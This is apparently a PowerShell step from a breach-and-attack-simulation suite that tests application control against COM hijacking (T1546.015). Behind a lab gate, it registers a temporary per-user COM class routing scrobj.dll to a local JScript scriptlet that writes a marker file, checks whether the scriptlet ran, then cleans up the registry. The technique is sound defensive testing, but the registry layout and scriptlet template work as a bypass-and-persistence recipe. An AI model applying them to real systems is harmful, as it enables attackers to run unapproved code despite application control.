Invoke-AppCtlTest -Family 'com_activation' -Collection 'Dll' -Needle 'scrobj.dll' -Technique 'T1546.015' -Attempt {
  if ($env:BAS_CONFIRM_APPCONTROL_COM_REGISTER -cne 'true') { return @{ Ran = $false; Exit = -1; Note = 'lab_gate_not_set'; NotApplicable = 'lab gate BAS_CONFIRM_APPCONTROL_COM_REGISTER is not set to true; this step registers a temporary per-user COM class and is skipped without it' } }
  $tid8 = $script:AppCtlTid.Substring(0, 8)
  $guid = '{' + [guid]::NewGuid().ToString().ToUpper() + '}'
  $prog = "BasSim.$tid8"
  $cls = "HKCU:\Software\Classes\CLSID\$guid"
  $mk = Join-Path $script:AppCtlWork 'com-marker.txt'
  $sct = Join-Path $script:AppCtlWork "bas_$tid8.sct"
  $body = "<?XML version=`"1.0`"?><scriptlet><registration progid=`"$prog`" classid=`"$guid`"/><script language=`"JScript`"><![CDATA[var f=new ActiveXObject('Scripting.FileSystemObject').CreateTextFile('" + $mk.Replace([string][char]92, '/').Replace("'", [string][char]92 + "'") + "',true);f.Write('" + $script:AppCtlMarker + "');f.Close();]]></script></scriptlet>"
  Set-Content -Path $sct -Value $body -Encoding ASCII
  $scrobj = Join-Path $env:SystemRoot 'System32\scrobj.dll'
  $ok = $false
  try {
    New-Item -Path $cls -Force | Out-Null; Set-ItemProperty -Path $cls -Name '(default)' -Value 'BAS-SIM-APPCTL'
    New-Item -Path "$cls\InprocServer32" -Force | Out-Null; Set-ItemProperty -Path "$cls\InprocServer32" -Name '(default)' -Value $scrobj; Set-ItemProperty -Path "$cls\InprocServer32" -Name ThreadingModel -Value 'Apartment'
    New-Item -Path "$cls\ScriptletURL" -Force | Out-Null; Set-ItemProperty -Path "$cls\ScriptletURL" -Name '(default)' -Value ('file:///' + $sct.Replace([string][char]92, '/').Replace(' ', '%20'))
    New-Item -Path "HKCU:\Software\Classes\$prog" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Classes\$prog" -Name '(default)' -Value 'BAS-SIM-APPCTL'
    New-Item -Path "HKCU:\Software\Classes\$prog\CLSID" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\Software\Classes\$prog\CLSID" -Name '(default)' -Value $guid
    $ok = $true
    try { $o = New-Object -ComObject $prog } catch {}
    for ($i = 0; $i -lt 10 -and -not (Test-AppCtlMarker $mk); $i++) { Start-Sleep -Milliseconds 300 }
  } finally {
    Remove-Item -Path $cls -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item -Path "HKCU:\Software\Classes\$prog" -Recurse -Force -ErrorAction SilentlyContinue
  }
  $left = (Test-Path $cls) -or (Test-Path "HKCU:\Software\Classes\$prog")
  return @{ Ran = (Test-AppCtlMarker $mk); Exit = 0; Note = "registered=$ok registry_removed=$(-not $left) activation=scriptlet_via_scrobj"; NotApplicable = '' }
}
